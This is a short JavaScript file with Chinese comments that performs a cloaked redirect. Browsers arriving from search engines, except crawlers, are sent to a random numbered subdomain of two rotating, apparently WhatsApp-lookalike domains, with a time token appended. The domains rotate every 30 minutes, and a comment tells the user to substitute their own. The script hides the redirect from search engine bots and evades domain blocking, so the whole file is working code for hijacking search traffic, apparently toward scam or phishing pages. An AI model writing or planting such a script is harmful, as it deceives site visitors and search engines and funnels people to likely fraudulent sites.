const usedNumbers = new Set();

// 判断是否来自搜索引擎
function isFromSearchEngine() {
  const ref = document.referrer.toLowerCase();
  const engines = ["google.", "bing.", "yahoo.", "yandex.", "duckduckgo.", "baidu.", "sogou.", "sm.", "360."];
  return engines.some(e => ref.includes(e));
}

// 判断是否为爬虫
function isSpider() {
  const ua = navigator.userAgent.toLowerCase();
  const spiders = [
    "googlebot", "bingbot", "baiduspider", "yandexbot", "duckduckbot",
    "sogou", "sosospider", "360spider", "slurp", "mj12bot", "ahrefsbot",
    "semrushbot", "seznambot", "dotbot", "crawler", "spider", "bot"
  ];
  return spiders.some(s => ua.includes(s));
}

// 生成不含数字4 且 不重复的随机数
function getRandomNoFour() {
  let num;
  const baseRange = 3000;

  while (true) {
    const expandTimes = Math.max(1, Math.ceil(usedNumbers.size / baseRange) + 1);
    const max = baseRange * expandTimes;
    num = Math.floor(Math.random() * max) + 1;

    const str = String(num);
    if (!str.includes("4") && !usedNumbers.has(num)) {
      usedNumbers.add(num);
      break;
    }
  }
  return num;
}

// 主域名配置（自行替换）
const mainDomains = ["cq-whatappop.com", "cw-whatappop.com"];

// 每30分钟自动轮换主域名
function getCurrentMainDomain() {
  const HALF_HOUR = 1800 * 1000;
  const segment = Math.floor(Date.now() / HALF_HOUR);

  if (window._cachedTimeSegment !== segment || !window._cachedMainDomain) {
    const idx = segment % mainDomains.length;
    window._cachedMainDomain = mainDomains[idx];
    window._cachedTimeSegment = segment;
  }

  return window._cachedMainDomain;
}

// 生成随机子域名
function getRandomSubdomain() {
  const num = getRandomNoFour();
  const domain = getCurrentMainDomain();
  return `${num}web.${domain}`;
}

// 生成跳转 token
function generateToken() {
  const t = Math.floor(Date.now() / 1000);
  return btoa(`${t}|ws`);
}

// 主逻辑：搜索引擎 + 非爬虫 才跳转
(function () {
  if (!isFromSearchEngine() || isSpider()) return;

  const token = generateToken();
  const target = `https://${getRandomSubdomain()}/?k=${token}`;
  window.location.href = target;
})();